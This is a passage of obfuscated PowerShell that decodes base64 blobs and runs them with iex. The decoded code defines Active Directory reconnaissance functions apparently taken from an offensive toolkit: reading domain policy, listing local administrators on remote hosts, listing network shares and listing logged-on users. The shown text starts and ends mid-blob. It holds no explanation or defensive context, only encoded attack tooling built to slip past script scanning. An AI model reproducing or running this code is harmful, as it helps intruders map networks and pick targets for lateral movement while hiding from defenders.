IKICAgICAgICBpZigkR1BPKSB7CiAgICAgICAgICAgICRHcHRUbXBsUGF0aCA9ICRHUE8uZ3BjZmlsZXN5c3BhdGggKyAiXE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZiIKICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAewogICAgICAgICAgICAgICAgJ0dwdFRtcGxQYXRoJyA9ICRHcHRUbXBsUGF0aAogICAgICAgICAgICAgICAgJ1VzZVBTRHJpdmUnID0gJFVzZVBTRHJpdmUKICAgICAgICAgICAgfQogICAgICAgICAgICBHZXQtR3B0VG1wbCBAUGFyc2VBcmdzCiAgICAgICAgfQogICAgfQogICAgZWxzZWlmKCRTb3VyY2UgLWVxICJEQyIpIHsKICAgICAgICAkR1BPID0gR2V0LU5ldEdQTyAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIgLUdQT25hbWUgIns2QUMxNzg2Qy0wMTZGLTExRDItOTQ1Ri0wMEMwNEZCOTg0Rjl9IgogICAgICAgIGlmKCRHUE8pIHsKICAgICAgICAgICAgJEdwdFRtcGxQYXRoID0gJEdQTy5ncGNmaWxlc3lzcGF0aCArICJcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mIgogICAgICAgICAgICAkUGFyc2VBcmdzID0gIEB7CiAgICAgICAgICAgICAgICAnR3B0VG1wbFBhdGgnID0gJEdwdFRtcGxQYXRoCiAgICAgICAgICAgICAgICAnVXNlUFNEcml2ZScgPSAkVXNlUFNEcml2ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIEdldC1HcHRUbXBsIEBQYXJzZUFyZ3MgfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZigkUmVzb2x2ZVNpZHMpIHsKICAgICAgICAgICAgICAgICAgICAkUG9saWN5ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRfLnBzb2JqZWN0LnByb3BlcnRpZXMgfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCAkXy5OYW1lIC1lcSAnUHJpdmlsZWdlUmlnaHRzJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByaXZpbGVnZVJpZ2h0cyA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLlZhbHVlLnBzb2JqZWN0LnByb3BlcnRpZXMgfCBGb3JlYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNpZHMgPSAkXy5WYWx1ZSB8IEZvcmVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRfIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb252ZXJ0LVNpZFRvTmFtZSAkXyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgRm9yZWFjaC1PYmplY3QgeyBDb252ZXJ0LVNpZFRvTmFtZSAkXyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtRGVidWcgIkVycm9yIHJlc29sdmluZyBTSUQgOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJpdmlsZWdlUmlnaHRzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJF8uTmFtZSAkU2lkcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFBvbGljeSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQcml2aWxlZ2VSaWdodHMnICRQcml2aWxlZ2VSaWdodHMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQb2xpY3kgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAkXy5OYW1lICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJFBvbGljeQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRfIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvY2FsR3JvdXAgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbVmFsaWRhdGVTY3JpcHQoe1Rlc3QtUGF0aCAtUGF0aCAkXyB9KV0KICAgICAgICBbQWxpYXMoJ0hvc3RMaXN0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWxlLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEdyb3VwTmFtZSA9ICdBZG1pbmlzdHJhdG9ycycsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTGlzdEdyb3VwcywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSZWN1cnNlCiAgICApCiAgICBiZWdpbiB7CiAgICAgICAgaWYgKCgtbm90ICRMaXN0R3JvdXBzKSAtYW5kICgtbm90ICRHcm91cE5hbWUpKSB7CiAgICAgICAgICAgICRPYmpTSUQgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCdTLTEtNS0zMi01NDQnKQogICAgICAgICAgICAkT2JqZ3JvdXAgPSAkT2JqU0lELlRyYW5zbGF0ZSggW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50XSkKICAgICAgICAgICAgJEdyb3VwTmFtZSA9ICgkT2JqZ3JvdXAuVmFsdWUpLlNwbGl0KCdcJylbMV0KICAgICAgICB9CiAgICB9CiAgICBwcm9jZXNzIHsKICAgICAgICAkU2VydmVycyA9IEAoKQogICAgICAgIGlmKCRDb21wdXRlckZpbGUpIHsKICAgICAgICAgICAgJFNlcnZlcnMgPSBHZXQtQ29udGVudCAtUGF0aCAkQ29tcHV0ZXJGaWxlCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkU2VydmVycyArPSBHZXQtTmFtZUZpZWxkIC1PYmplY3QgJENvbXB1dGVyTmFtZQogICAgICAgIH0KICAgICAgICBGb3JFYWNoKCRTZXJ2ZXIgaW4gJFNlcnZlcnMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmKCRMaXN0R3JvdXBzKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyID0gW0FEU0ldIldpbk5UOi8vJFNlcnZlcixjb21wdXRlciIKICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIucHNiYXNlLmNoaWxkcmVuIHwgV2hlcmUtT2JqZWN0IHsgJF8ucHNiYXNlLnNjaGVtYUNsYXNzTmFtZSAtZXEgJ2dyb3VwJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXJ2ZXInICRTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwJyAoJF8ubmFtZVswXSkKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgKChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyICRfLm9iamVjdHNpZFswXSwwKS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0Rlc2NyaXB0aW9uJyAoJF8uRGVzY3JpcHRpb25bMF0pCiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzID0gQCgkKFtBRFNJXSJXaW5OVDovLyRTZXJ2ZXIvJEdyb3VwTmFtZSIpLnBzYmFzZS5JbnZva2UoJ01lbWJlcnMnKSkKICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXJ2ZXInICRTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAgICAgJEFkc1BhdGggPSAoJF8uR2V0VHlwZSgpLkludm9rZU1lbWJlcignQWRzcGF0aCcsICdHZXRQcm9wZXJ0eScsICROdWxsLCAkXywgJE51bGwpKS5SZXBsYWNlKCdXaW5OVDovLycsICcnKQogICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSA9IENvbnZlcnQtTlQ0dG9DYW5vbmljYWwgLU9iamVjdE5hbWUgJEFkc1BhdGgKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJE5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGUUROID0gJE5hbWUuc3BsaXQoIi8iKVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5hbWUgPSAkQWRzUGF0aC5zcGxpdCgiLyIpWy0xXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSAiJEZRRE4vJE9iak5hbWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSXNEb21haW4gPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSAkQWRzUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElzRG9tYWluID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBY2NvdW50TmFtZScgJE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTSUQnICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkXy5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCdPYmplY3RTSUQnLCAnR2V0UHJvcGVydHknLCAkTnVsbCwgJF8sICROdWxsKSwwKSkuVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRGlzYWJsZWQnICQoIGlmKC1ub3QgJElzRG9tYWluKSB7IHRyeSB7ICRfLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0FjY291bnREaXNhYmxlZCcsICdHZXRQcm9wZXJ0eScsICROdWxsLCAkXywgJE51bGwpIH0gY2F0Y2ggeyAnRVJST1InIH0gfSBlbHNlIHsgJEZhbHNlIH0gKQogICAgICAgICAgICAgICAgICAgICAgICAkSXNHcm91cCA9ICgkXy5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCdDbGFzcycsICdHZXRQcm9wZXJ0eScsICROdWxsLCAkXywgJE51bGwpIC1lcSAnZ3JvdXAnKQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRJc0RvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICBpZigkSXNHcm91cCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMYXN0TG9naW4nICIiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAoICRfLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0xhc3RMb2dpbicsICdHZXRQcm9wZXJ0eScsICROdWxsLCAkXywgJE51bGwpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFJlY3Vyc2UgLWFuZCAkSXNEb21haW4gLWFuZCAkSXNHcm91cCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZRRE4gPSAkTmFtZS5zcGxpdCgiLyIpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gJE5hbWUuc3BsaXQoIi8iKVsxXS50cmltKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdldC1OZXRHcm91cE1lbWJlciAtR3JvdXBOYW1lICRHcm91cE5hbWUgLURvbWFpbiAkRlFETiAtRnVsbERhdGEgLVJlY3Vyc2UgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NlcnZlcicgIiRGUUROLyQoJF8uR3JvdXBOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRE4gPSAkXy5kaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTWVtYmVyRE4uc3ViU3RyaW5nKCRNZW1iZXJETi5JbmRleE9mKCJEQz0iKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5zYW1BY2NvdW50VHlwZSAtbmUgIjgwNTMwNjM2OCIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzR3JvdXAgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzR3JvdXAgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnNhbUFjY291bnROYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gJF8uc2FtQWNjb3VudE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gQ29udmVydC1TaWRUb05hbWUgJF8uY24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyTmFtZSA9ICRfLmNuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtRGVidWcgIkVycm9yIHJlc29sdmluZyBTSUQgOiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0FjY291bnROYW1lJyAiJE1lbWJlckRvbWFpbi8kTWVtYmVyTmFtZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgJF8ub2JqZWN0c2lkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXNhYmxlZCcgJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0dyb3VwJyAkTWVtYmVySXNHcm91cAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMYXN0TG9naW4nICcnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlshXSBFcnJvcjogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNoYXJlIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcKICAgICkKICAgIGJlZ2luIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWJ1ZyddKSB7CiAgICAgICAgICAgICREZWJ1Z1ByZWZlcmVuY2UgPSAnQ29udGludWUnCiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgJENvbXB1dGVyTmFtZSA9IEdldC1OYW1lRmllbGQgLU9iamVjdCAkQ29tcHV0ZXJOYW1lCiAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCiAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0U2hhcmVFbnVtKCRDb21wdXRlck5hbWUsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQogICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKICAgICAgICBXcml0ZS1EZWJ1ZyAiR2V0LU5ldFNoYXJlIHJlc3VsdDogJFJlc3VsdCIKICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkU0hBUkVfSU5GT18xOjpHZXRTaXplKCkKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFNIQVJFX0lORk9fMQogICAgICAgICAgICAgICAgJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIHN3aXRjaCAoJFJlc3VsdCkgewogICAgICAgICAgICAgICAgKDUpICAgICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSB1c2VyIGRvZXMgbm90IGhhdmUgYWNjZXNzIHRvIHRoZSByZXF1ZXN0ZWQgaW5mb3JtYXRpb24uJ30KICAgICAgICAgICAgICAgICgxMjQpICAgICAgICAge1dyaXRlLURlYnVnICdUaGUgdmFsdWUgc3BlY2lmaWVkIGZvciB0aGUgbGV2ZWwgcGFyYW1ldGVyIGlzIG5vdCB2YWxpZC4nfQogICAgICAgICAgICAgICAgKDg3KSAgICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSBzcGVjaWZpZWQgcGFyYW1ldGVyIGlzIG5vdCB2YWxpZC4nfQogICAgICAgICAgICAgICAgKDIzNCkgICAgICAgICB7V3JpdGUtRGVidWcgJ01vcmUgZW50cmllcyBhcmUgYXZhaWxhYmxlLiBTcGVjaWZ5IGEgbGFyZ2UgZW5vdWdoIGJ1ZmZlciB0byByZWNlaXZlIGFsbCBlbnRyaWVzLid9CiAgICAgICAgICAgICAgICAoOCkgICAgICAgICAgIHtXcml0ZS1EZWJ1ZyAnSW5zdWZmaWNpZW50IG1lbW9yeSBpcyBhdmFpbGFibGUuJ30KICAgICAgICAgICAgICAgICgyMzEyKSAgICAgICAge1dyaXRlLURlYnVnICdBIHNlc3Npb24gZG9lcyBub3QgZXhpc3Qgd2l0aCB0aGUgY29tcHV0ZXIgbmFtZS4nfQogICAgICAgICAgICAgICAgKDIzNTEpICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSBjb21wdXRlciBuYW1lIGlzIG5vdCB2YWxpZC4nfQogICAgICAgICAgICAgICAgKDIyMjEpICAgICAgICB7V3JpdGUtRGVidWcgJ1VzZXJuYW1lIG5vdCBmb3VuZC4nfQogICAgICAgICAgICAgICAgKDUzKSAgICAgICAgICB7V3JpdGUtRGVidWcgJ0hvc3RuYW1lIGNvdWxkIG5vdCBiZSBmb3VuZCd9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvZ2dlZG9uIHsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcKICAgICkKICAgIGJlZ2luIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWJ1ZyddKSB7CiAgICAgICAgICAgICREZWJ1Z1ByZWZlcmVuY2UgPSAnQ29udGludWUnCiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgJENvbXB1dGVyTmFtZSA9IEdldC1OYW1lRmllbGQgLU9iamVjdCAkQ29tcHV0ZXJOYW1lCiAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxCiAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCiAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0V2tzdGFVc2VyRW51bSgkQ29tcHV0ZXJOYW1lLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCiAgICAgICAgV3JpdGUtRGVidWcgIkdldC1OZXRMb2dnZWRvbiByZXN1bHQ6ICRSZXN1bHQiCiAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewogICAgICAgICAgICAkSW5jcmVtZW50ID0gJFdLU1RBX1VTRVJfSU5GT18xOjpHZXRTaXplKCkKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJEVudHJpZXNSZWFkKTsgJGkrKykgewogICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFdLU1RBX1VTRVJfSU5GT18xCiAgICAgICAgICAgICAgICAkSW5mbyB8IFNlbGVjdC1PYmplY3QgKgogICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAkT2Zmc2V0ICs9ICRJbmNyZW1lbnQKICAgICAgICAgICAgfQogICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgc3dpdGNoICgkUmVzdWx0KSB7CiAgICAgICAgICAgICAgICAoNSkgICAgICAgICAgIHtXcml0ZS1EZWJ1ZyAnVGhlIHVzZXIgZG9lcyBub3QgaGF2ZSBhY2Nlc3MgdG8gdGhlIHJlcXVlc3RlZCBpbmZvcm1hdGlvbi4nfQogICAgICAgICAgICAgICAgKDEyNCkgICAgICAgICB7V3JpdGUtRGVidWcgJ1RoZSB2YWx1ZSBzcGVjaWZpZWQgZm9yIHRoZSBsZXZlbCBwYXJhbWV0ZXIgaXMgbm90IHZhbGlkLid9CiAgICAgICAgICAgICAgICAoODcpICAgICAgICAgIHtXcml0ZS1EZWJ1ZyAnVGhlIHNwZWNpZmllZCBwYXJhbWV0ZX